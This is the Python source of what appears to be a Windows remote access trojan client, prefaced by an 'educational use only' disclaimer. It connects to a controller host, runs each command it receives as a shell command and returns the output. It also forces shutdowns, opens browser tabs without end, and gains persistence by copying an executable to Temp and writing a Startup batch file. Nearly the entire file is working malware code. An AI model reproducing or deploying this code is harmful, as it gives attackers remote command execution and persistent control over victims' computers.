# legal disclamer:
#it's just for educational things
#test it just in system your have permissions to use that program
#rememenber, with powers come big responsabilitys. ass: Rossini135
#contact infos: 
#email: rossiniroberto52@gmail.com
#twitter: @rossin135
#github: https://github.com/rossiniroberto52
import socket, os, subprocess, webbrowser, shutil
from getpass import getuser
from pathlib import Path
from os import path
from sys import argv

#most used vars
USER = getuser()

#used PATHS:
temp_path = r'C:\Users\%s\AppData\Local\Temp' % USER
#bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER
#file_path = path.dirname(path.realpath(__file__))


def kill():
    os.system("msg %username% your system will be shutdown because i hack then :) lol")
    os.system("shutdown -s -t 3")

def clone():
    try:
        os.mkdir(temp_path+"\\_TMP995858_atmpk")
    except:
        pass

    origin_arq = Path(path.dirname(path.realpath(__file__))+"\\clt.exe")
    destini_dir = Path(temp_path+"\\_TMP995858_atmpk")
    arq_Name = os.path.basename(origin_arq)
    arq_dest = os.path.join(destini_dir, arq_Name)
    shutil.copy(origin_arq, arq_dest)



def bat_create(file_path=""):
    if(file_path == ""):
        file_path = path.dirname(path.realpath(__file__))
        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "C:\Users\%s\AppData\Local\Temp\clt.exe" %s' % USER, file_path + "\\" + argv[0])
        msg = "teste / .bat file created!"
        conn.send(msg.encode("utf-8"))
        #src = Path(file_path)
        #dstn = Path(temp_path)

conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect(("192.168.0.15",6667))

while True:
    cmd = conn.recv(1024).decode('utf-8')
    if cmd == "exit":
        break
    if cmd == "kill":
        kill()
    if cmd == "troll":
        link = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
        os.system("msg %username% lol")
        while True:
            webbrowser.open_new(link)        
    if cmd == "stay":
        clone()
        bat_create()
        #kill()
    os.system(cmd)
    output = subprocess.getoutput(cmd)
    conn.send(output.encode('utf-8'))
    os.system("cls")
conn.close()
exit()